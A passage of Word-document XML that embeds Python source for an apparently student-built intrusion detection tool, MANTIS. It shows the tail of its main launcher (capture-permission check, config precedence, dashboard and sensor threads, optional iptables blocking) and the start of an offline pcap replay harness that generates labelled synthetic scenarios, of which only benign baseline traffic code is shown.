    <w:p w14:paraId="2C7D349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A57E4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hasattr(socket, "AF_PACKET"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E39D7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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F1DA77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probe = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FAE5F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1F85AD6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probe = socket.socket(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="665AAF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socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="400E5BB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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01E24A7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(PermissionError, OSError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6150554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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E57E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finally:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3324A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probe is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11121C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probe.close()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED44C39" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="317D24E3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="28FCEDC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main(argv=None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3BF3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args = parse_args(argv)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="390390A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has_raw_capture_access():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D21A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raw packet capture is unavailable")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F61083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run with sudo, or install capabilities using sudo ./install.sh")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1885E0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offline alternative:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="630F089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python3 replay.py --generate demo.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52C9986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python3 replay.py --pcap demo.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AE91B9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1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD508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print(BANNER)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A9DA76" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D2EB3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config precedence: defaults -&gt; file -&gt; environment -&gt; cli flags</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73AF4F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args.config:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278CE4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CONFIG.load_file(args.config)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="631DD6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CONFIG.load_env()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAD5AA8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="377B934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args.port is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACD15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CONFIG.udp_port = args.port</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48C2B1D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args.block_on:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="702DCA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CONFIG.block_on = [k.strip() for k in args.block_on.split(",")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B1A2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k.strip()]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64B4AC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key in ("zscore_threshold", "zscore_window", "ddos_min_pps",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="024A585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"ddos_consecutive_intervals", "knn_k", "block_enabled",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="792C7B3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"alert_dedup_seconds",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A7EE25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"source_attribution_min_share",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30BEF95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"privacy_mode", "anonymise_ips", "payload_excerpt_bytes",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2970DD4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"pcap_file", "pcap_snaplen", "blacklist_file", "log_file",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69E659C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"packet_buffer"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="450F88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value = getattr(args, key, None)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF57D5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value is not None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D5FB0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setattr(CONFIG, key, value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="370AEFAA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39991D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args.mode:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42033D6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op_mode = args.mode.upper()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11581BA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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C2A5B3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print("Mode: 1) CLI dashboard   2) Web dashboard (port %d)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFB37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CONFIG.http_port)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="638C61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choice = input("Choice [1/2] (default 1): ").strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8509B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op_mode = "WEB" if choice == "2" else "CLI"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D1D338" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61A0F83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CONFIG.block_enabled:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="775F2CE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ACTIVE DEFENCE ENABLED - iptables DROP rules will be "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="194A42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"inserted for: %s" % ", ".join(CONFIG.block_on))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50D3011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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49DDE2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active defence disabled (pass --block to enable)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604D71A4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="160D914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stats_q = queue.Queue()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218AE5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alert_q = queue.Queue()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6883D289" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2430C58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ui = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E16E49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forward_alerts = False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4C9487" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47EADB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op_mode == "CLI":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1802229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ui = dashboard.Dashboard()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F63BF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args.remote:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156690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CONFIG.udp_host = args.remote</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AB3F3F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forward_alerts = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A32A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distributed mode -&gt; %s:%d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A1DC8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(CONFIG.udp_host, CONFIG.udp_port))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1694BA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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62D1C2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import dashboard_ui.siem as siem</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="241E750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threading.Thread(target=siem.start_siem, daemon=True).start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F7D261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web dashboard: http://127.0.0.1:%d" % CONFIG.http_port)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2A832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CONFIG.udp_host = args.remote or "127.0.0.1"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF5C68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forward_alerts = True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BCF248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time.sleep(1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BA35CD" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66AEC7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the sensor now owns the audit log, telemetry and response policy via its</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2D09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AlertDispatcher, so this loop only has to drive the UI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE1FF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threading.Thread(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="551CFC8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target=sensor.start_sensor,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5410C57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kwargs={"stats_queue": stats_q, "alert_queue": alert_q,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227390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"config": CONFIG, "forward_alerts": forward_alerts},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="468192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daemon=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73EFD2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).start()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="527D2146" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="257268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3125899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while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="081B2A5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latest = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="153300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while not stats_q.empty():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6097B26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36A3BB7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latest = stats_q.get_nowait()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="425A7C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queue.Empty:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="247A1D2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break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BBD24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latest and ui:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223AB3A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ui.update_stats(latest["pps"], latest["mean"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410BEB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latest["z_score"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0167F65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latest.get("ddos_candidate", False),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6317E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latest.get("ddos_active", False))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="509851F5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E8CF7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while not alert_q.empty():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="011173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15824B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msg = alert_q.get_nowait()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42894D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queue.Empty:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287270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break</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49645A1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ui:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29E124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ui.add_alert(msg)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D44539F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0148D42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ui:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FFAA6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ui.refresh()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2838B072" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21D5DC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10 small sleeps so ctrl+c reacts quickly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248696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_ in range(10):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4597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time.sleep(0.1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACE5962" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1947CD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KeyboardInterrupt:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B503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print("\n[!] shutting down")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2547A0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0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47EAEF46" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AEA2AA5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2472CA1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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62BFBF8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sys.exit(main())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="712287F5"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src/replay.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54C6C8E0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>373 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6915116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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6849F9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"""Offline PCAP replay harness for MANTIS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78FF50AE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="75C70EC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This tool reads a capture file and pushes every frame through the same packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708FEEB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parser and five detection engines used by the live sensor.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC6DD3E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="542274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The replay path provides three useful properties:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E9CD86" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4C7E70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Reproducibility - a fixed capture yields the same input on every run.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C05AB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No privileges - replay needs no root access, raw socket, or transmitted</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="536423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attack traffic, including on systems without AF_PACKET.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B3A2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Independent inspection - the capture can be opened in Wireshark or</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D7755C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tcpdump to confirm the frame content.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46226558" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3096C7B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Two modes:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2377D2A1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46D8319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--generate FILE   synthesise a labelled attack scenario capture</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF37C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--pcap FILE       replay a capture through the engines and report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DFCCE2A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="367DDE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Standard library only.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15D270E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4541FA0D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F229E0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argparse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E15ACE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json</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609676B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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0754A2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struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FDCEA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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27EEABF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time</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A48433B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1147E4C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HERE = os.path.dirname(os.path.abspath(__file__))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1FB4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HERE not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7158A9A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sys.path.insert(0, HERE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717194DA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D68751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engines.bloom as bloom</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B60E3F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engines.kmeans as kmeans</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F16A1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engines.knn as knn</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523F51E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engines.naive_bayes as naive_bayes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62358B4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engines.z_score as z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2D929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sensor_node.parser as parser_mod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E5C81B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import utils.mitre as mitre</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DEA314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utils.pcap as pcap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C71A08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from utils.config import CONFIG</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E272650" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EF5C6C4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65D7493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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F2067C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scenario generator</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6939D1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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A27DD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generate_scenario(path, blacklist_ip="10.0.0.66"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165C8C2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"""Write a synthetic capture containing four distinct attack phases.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="777932E4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FA251A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The phases are chosen so that each detection engine has something to find,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11238B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which makes the replay a single-command demonstration of the whole</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BAD5AE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ensemble:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6484BF48" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53AB20E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phase 1  baseline browsing      -&gt; no alert (specificity check)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671AC9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phase 2  horizontal port scan   -&gt; KNN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09B36C4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phase 3  sustained SYN flood    -&gt; Z-Score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="434CFCB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phase 4  SQLi + XSS payloads    -&gt; Naive Bayes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B88B3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phase 5  known-bad source IP    -&gt; Bloom Filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="465D20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DBC9C9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base_ts = time.time()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47D028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phases = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17B6E8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writer = pcap.PcapWriter(path, snaplen=200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F15436B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DC8565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emit(frame, second, index, per_second):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A4DB6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writer.write(frame, ts=base_ts + second + (index / float(per_second)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64813D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orig_len=len(frame))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D0E399C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35C5053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phase 1: 15 seconds of ordinary browsing, ~10 pps over a few ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6266E0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second in range(0, 15):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC9460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 in range(10):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07901B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port = [80, 443, 53, 22][i % 4]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E8D86A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emit(parser_mod.build_tcp(sport=40000 + i, dport=port,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5673B0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flags=0x18, data=b"GET /index.html HTTP/1.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3988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src="192.168.1.50"), second, i, 10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D4323D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phases.append(("baseline browsing", "0-14s", "no alert expected"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C33F2F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
